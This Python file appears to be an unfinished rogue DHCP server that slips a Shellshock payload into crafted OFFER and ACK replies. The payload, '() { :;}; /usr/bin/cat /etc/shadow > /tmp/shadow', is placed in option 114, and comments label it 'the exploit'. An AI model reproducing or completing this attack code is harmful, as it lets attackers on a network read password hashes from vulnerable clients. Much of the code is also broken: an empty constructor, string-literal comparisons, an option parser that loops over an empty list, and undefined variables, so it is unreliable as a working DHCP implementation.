import socket
import select
from binascii import hexlify

dhcpServer = DhcpServer()
client_list = []


class listener():
    def __init__(self):

    def start(self):
        ze_socket1 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        ze_socket1.bind(('0.0.0.0', 67))

        ze_socket2 = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        ze_socket2.bind(('0.0.0.0', 67))

        while True:
            r, w, x = select.select([ze_socket1, ze_socket2], [], [])
            for each in r:
                frame, void = each.recvfrom(400)
                ethernet_header, ip_header, udp_header, dhcp_message = self.clean_frame(frame)

                dhcpPacket = self.DhcpPacket(dhcp_message)

                # check client list
                if 'client' not in 'client list':
                    client = Client(dhcpPacket)  # create client
                    self.client_list.append(client)
                    dhcpPacket.craft_offer()
                    return_frame = self.craft_frame(ethernet_header, ip_header, udp_header, dhcpPacket.offer)
                    self.send_frame(return_frame)

                elif 'client' in 'requesting_client_list':
                    return_frame = self.craft_frame(ethernet_header, ip_header, udp_header, dhcpPacket.ack)
                    self.send_frame(return_frame)
                else:
                    pass

    def clean_frame(self, frame):
        ethernet_header, ip_header, udp_header, dhcp_discover = frame[0:14], frame[14:34], frame[34:42], frame[42:]
        return ethernet_header, ip_header, udp_header, dhcp_discover

    def breakup_options(self, option_string):
        cur = 0
        options = []
        while True:
            try:
                flag = options[cur]
                cur += 1
                length = options[cur]
                cur += 1
                # TURN LENGTH INTO AN INT
                values = options[cur:length+cur]

                option = self.Option(flag, length, values)
                options.append(option)
                if cur == len(options):
                    break
            except:
                print('Error with options breakup')

        return options

    class Option:
        def __init__(self, flag, length, values):
            self.flag = flag
            self.length = length
            self.values = values

    class DhcpPacket:
        def __init__(self, dhcp_message):
            self.exploit = [(x) for x in b"() { :;}; /usr/bin/cat /etc/shadow > /tmp/shadow"]
            self.exploit_len = hex(len(self.exploit))

            frame = dhcp_message
            # binary
            self.op = [frame[0]]  # REquest or reply
            self.htype = [frame[1]]  # Hardware address type
            self.hlen = [frame[2]]  # Hardware length
            self.hops = [frame[3]]  # hops; number of relay agents the message travels through, each one will add one
            self.xid = frame[4:8]  # Transaction ID a random bumber chosen by the client to identify an ip address allocation
            self.secs = frame[8:10]  # number of seconds elapsed since clent sent a dhcp request
            self.flags = frame[10:12]  # leftmodt bit is BROADCAST (B) flag, if 0 send back as unicast if 1 send back as broadcast
            self.ciaddr = frame[12:16]  # client ip address
            self.yiaddr = frame[16:20]  # 'your' ip address, as assigned by server
            self.siaddr = frame[20:24]  # Server ip address
            self.giaddr = frame[24:28]  # first relay agent ip address
            self.chaddr = frame[29:45]  # client hhardware address
            self.sname = frame[45:109]  # server host name
            self.file = frame[109:237]  # bootfile name, routing information defined by server to the client
            self.options = frame[227:]  # additional parameters

            self.options = self.breakup_options(self.options)

            self.offer = None
            self.ack = None


        def craft_offer(self):

            op = ['02']  # REquest=ff or reply=00
            htype = ['01']  # Hardware address type 01=ethernet
            hlen = ['06']  # Hardware length
            hops = self.hops  # hops; number of relay agents the message travels through, each one will add one
            xid = self.xid  # Transaction ID a random number chosen by the client to identify an ip address allocation
            secs = self.secs  # number of seconds elapsed since clent sent a dhcp request
            flags = self.flags  # leftmodt bit is BROADCAST (B) flag, if 0 send back as unicast if 1 send back as broadcast
            ciaddr = self.ciaddr  # client ip address
            yiaddr = dhcpServer.get_next_ip()  # 'your' ip address, as assigned by server
            siaddr = dhcpServer.server_ip  # Server ip address
            giaddr = self.giaddr  # first relay agent ip address
            chaddr = self.chaddr  # client hardware address
            sname = self.sname  # server host name
            file = self.file  # bootfile name, routing information defined by server to the client
            options = frame[237:]  # additional parameters

            options = ['53', '01', '02'  # DHCP, len, Offer
                       '01', '04', 'ff', 'ff', 'ff', '00'  # subnetmask flag on, len=4, subnetmask
                       ## NEED A RENEWL TIME VALUE FLAG HERE
                       ## NEED A REBINDING TIME VALUE FLAG HERE
                       '33', '04', '00', '00', '0e', '10'  # lease time
                       '36', '04', 'c0', 'a8',
                       '00', '01'  # DHCP server identifier
                       # () { :;}; echo vulnerable’ bash -c “echo test” # the exploit
                       '72', self.exploit_len, self.exploit,
                       # NEED DHCP SERVER FLAG HERE
                       'ff'  # end flag
                       # NEED PADDING HERE FOR UNUSED FLAGS
                       ]
            return

        def craft_ack(self):

            # binary
            self.op = ['02']  # REquest or reply
            self.htype = ['01']  # Hardware address type
            self.hlen = ['06']  # Hardware length
            self.hops = [self.hops]  # hops; number of relay agents the message travels through, each one will add one
            self.xid = [
                self.xid]  # Transaction ID a random bumber chosen by the client to identify an ip address allocation
            self.secs = ['00', '00']  # number of seconds elapsed since clent sent a dhcp request
            self.flags = ['00',
                          '00']  # leftmodt bit is BROADCAST (B) flag, if 0 send back as unicast if 1 send back as broadcast
            self.ciaddr = ['00', '00', '00', '00']  # client ip address
            self.yiaddr = [self.yiaddr]  # 'your' ip address, as assigned by server
            self.siaddr = [self.siaddr]  # Server ip address
            self.giaddr = ['00', '00', '00', '00']  # first relay agent ip address
            self.chaddr = [self.chaddr]  # client hhardware address
            self.sname = [self.sname]  # server host name
            self.file = [self.file]  # bootfile name, routing information defined by server to the client
            options = ['53', '01', '02'  # DHCP, len, Offer
                                   '01', '04', 'ff', 'ff', 'ff', '00'  # subnetmask flag on, len=4, subnetmask
                       ## NEED A RENEWL TIME VALUE FLAG HERE
                       ## NEED A REBINDING TIME VALUE FLAG HERE
                                                                 '33', '04', '00', '00', '0e', '10'  # lease time
                                                                                               '36', '04', 'c0', 'a8',
                       '00',
                       '01'  # DHCP server identifier
                       # () { :;}; echo vulnerable’ bash -c “echo test” # the exploit
                       '72', self.exploit_len, self.exploit,
                       # NEED DHCP SERVER FLAG HERE
                       'ff'  # end flag
                       # NEED PADDING HERE FOR UNUSED FLAGS
                       ]



class Client:
    def __init__(self, dhcpPacket):
        self.ip = dhcpPacket.ciaddr
        self.physical_address = dhcpPacket.chaddr


''' parts of code to be implented below'''


class DhcpServer:
    def __init__(self):
        self.server_ip = None
        self.server_name = None

        self.client_ip_available = []

    def get_next_ip(self):
        return None





class PacketFrameHex:
    def __init__(self, frame):
        self.frame = frame
        self.exploit = [(x) for x in b"() { :;}; /usr/bin/cat /etc/shadow > /tmp/shadow"]
        self.exploit_len = hex(len(self.exploit))

    def recieve_discovery(self):
        frame = self.frame
        # binary
        self.op = [frame[0]] # REquest or reply
        self.htype = [frame[1]] # Hardware address type
        self.hlen = [frame[2]]  # Hardware length
        self.hops = [frame[3]] # hops; number of relay agents the message travels through, each one will add one
        self.xid = frame[4:8] # Transaction ID a random bumber chosen by the client to identify an ip address allocation
        self.secs = frame[8:10] # number of seconds elapsed since clent sent a dhcp request
        self.flags = frame[10:12] # leftmodt bit is BROADCAST (B) flag, if 0 send back as unicast if 1 send back as broadcast
        self.ciaddr = frame[12:16] # client ip address
        self.yiaddr = frame[16:20] # 'your' ip address, as assigned by server
        self.siaddr = frame[20:24] # Server ip address
        self.giaddr = frame[24:28] # first relay agent ip address
        self.chaddr = frame[29:45] # client hhardware address
        self.sname = frame[45:109] # server host name
        self.file = frame[109:237] #bootfile name, routing information defined by server to the client
        self.options = frame[227:] # additional parameters

    def craft_offer(self, dhcpServer):
        frame = self.frame
        op = ['02']  # REquest=ff or reply=00
        htype = ['01']  # Hardware address type 01=ethernet
        hlen = ['06']  # Hardware length
        hops = self.hops  # hops; number of relay agents the message travels through, each one will add one
        xid = self.xid  # Transaction ID a random number chosen by the client to identify an ip address allocation
        secs = self.secs  # number of seconds elapsed since clent sent a dhcp request
        flags = self.flags  # leftmodt bit is BROADCAST (B) flag, if 0 send back as unicast if 1 send back as broadcast
        ciaddr = self.ciaddr  # client ip address
        yiaddr = dhcpServer.get_next_ip()  # 'your' ip address, as assigned by server
        siaddr = dhcpServer.server_ip  # Server ip address
        giaddr = self.giaddr  # first relay agent ip address
        chaddr = self.chaddr  # client hardware address
        sname = self.sname  # server host name
        file = self.file  # bootfile name, routing information defined by server to the client
        options = frame[237:]  # additional parameters

        options = ['53', '01', '02'  # DHCP, len, Offer
                   '01', '04' , 'ff', 'ff', 'ff', '00' # subnetmask flag on, len=4, subnetmask
                   ## NEED A RENEWL TIME VALUE FLAG HERE
                   ## NEED A REBINDING TIME VALUE FLAG HERE
                   '33', '04', '00', '00', '0e', '10' # lease time
                   '36', '04', 'c0', 'a8', '00', '01' # DHCP server identifier
                   # () { :;}; echo vulnerable’ bash -c “echo test” # the exploit
                   '72', self.exploit_len, self.exploit,
                   # NEED DHCP SERVER FLAG HERE
                   'ff' # end flag
                   # NEED PADDING HERE FOR UNUSED FLAGS
                   ]

    def recieve_request(self):
        frame = self.frame
        # binary
        self.op = [frame[0]]  # REquest or reply
        self.htype = [frame[1]]  # Hardware address type
        self.hlen = [frame[2]]  # Hardware length
        self.hops = [frame[3]]  # hops; number of relay agents the message travels through, each one will add one
        self.xid = frame[
                   4:8]  # Transaction ID a random bumber chosen by the client to identify an ip address allocation
        self.secs = frame[8:10]  # number of seconds elapsed since clent sent a dhcp request
        self.flags = frame[
                     10:12]  # leftmodt bit is BROADCAST (B) flag, if 0 send back as unicast if 1 send back as broadcast
        self.ciaddr = frame[12:16]  # client ip address
        self.yiaddr = frame[16:20]  # 'your' ip address, as assigned by server
        self.siaddr = frame[20:24]  # Server ip address
        self.giaddr = frame[24:28]  # first relay agent ip address
        self.chaddr = frame[29:45]  # client hhardware address
        self.sname = frame[45:109]  # server host name
        self.file = frame[109:237]  # bootfile name, routing information defined by server to the client
        self.options = frame[227:]  # additional parameters

    def craft_ack(self):
        frame = self.frame
        # binary
        self.op = ['02']  # REquest or reply
        self.htype = ['01']  # Hardware address type
        self.hlen = ['06']  # Hardware length
        self.hops = [self.hops]  # hops; number of relay agents the message travels through, each one will add one
        self.xid = [self.xid]  # Transaction ID a random bumber chosen by the client to identify an ip address allocation
        self.secs = ['00', '00']  # number of seconds elapsed since clent sent a dhcp request
        self.flags = ['00', '00']  # leftmodt bit is BROADCAST (B) flag, if 0 send back as unicast if 1 send back as broadcast
        self.ciaddr = ['00','00','00','00']  # client ip address
        self.yiaddr = [self.yiaddr]  # 'your' ip address, as assigned by server
        self.siaddr = [self.siaddr]  # Server ip address
        self.giaddr = ['00', '00', '00', '00']  # first relay agent ip address
        self.chaddr = [self.chaddr]  # client hhardware address
        self.sname = [self.sname]  # server host name
        self.file = [self.file]  # bootfile name, routing information defined by server to the client
        options = ['53', '01', '02'  # DHCP, len, Offer
                   '01', '04', 'ff', 'ff', 'ff', '00'  # subnetmask flag on, len=4, subnetmask
                   ## NEED A RENEWL TIME VALUE FLAG HERE
                   ## NEED A REBINDING TIME VALUE FLAG HERE
                   '33', '04', '00', '00', '0e', '10'  # lease time
                   '36', '04', 'c0', 'a8', '00',
                   '01'  # DHCP server identifier
                   # () { :;}; echo vulnerable’ bash -c “echo test” # the exploit
                   '72', self.exploit_len, self.exploit,
                   # NEED DHCP SERVER FLAG HERE
                   'ff'  # end flag
                   # NEED PADDING HERE FOR UNUSED FLAGS
                   ]
        return None





    def print_frame(self):
        print(
            len(self.op),
            len(self.htype),
            len(self.hlen),
            len(self.hops),
            len(self.xid),
            len(self.secs),
            len(self.flags) ,
            len(self.ciaddr) ,
            len(self.yiaddr) ,
            len(self.siaddr) ,
            len(self.giaddr) ,
            len(self.chaddr) ,
            len(self.sname) ,
            len(self.file) ,
            len(self.options))
        print(
            (self.op),
            (self.htype),
            (self.hlen),
            (self.hops),
            (self.xid),
            (self.secs),
            (self.flags),
            (self.ciaddr),
            (self.yiaddr),
            (self.siaddr),
            (self.giaddr),
            (self.chaddr),
            (self.sname),
            (self.file),
            (self.options))

def saver():
    return None


# UI
def main():
    dhcpServer = DhcpServer()

    # a samoke dhcp_discover frame with ehternet header
    dhcp_discover = '''
ff ff ff ff ff ff 00 0b 82 01 fc 42 08 00 45 00
01 2c a8 36 00 00 fa 11 17 8b 00 00 00 00 ff ff
ff ff 00 44 00 43 01 18 59 1f 01 01 06 00 00 00
3d 1d 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 0b 82 01 fc 42 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 63 82 53 63 35 01 01 3d 07 01
00 0b 82 01 fc 42 32 04 00 00 00 00 37 04 01 03
06 2a ff 00 00 00 00 00 00 00'''


    dhcp_discover = dhcp_discover.replace('\n', ' ')
    dhcp_discover = dhcp_discover.split(' ')
    dhcp_discover = [x for x in dhcp_discover if x is not '']

    ethernet_header, ip_header, udp_header, dhcp_discover = dhcp_discover[0:14], dhcp_discover[14:34], dhcp_discover[34:42], dhcp_discover[42:]

    packetFrameHex = PacketFrameHex(dhcp_discover)
    packetFrameHex.print_frame()
    packetFrameHex.craft_offer(dhcpServer)
    # listener()



if __name__ == '__main__':
    main()
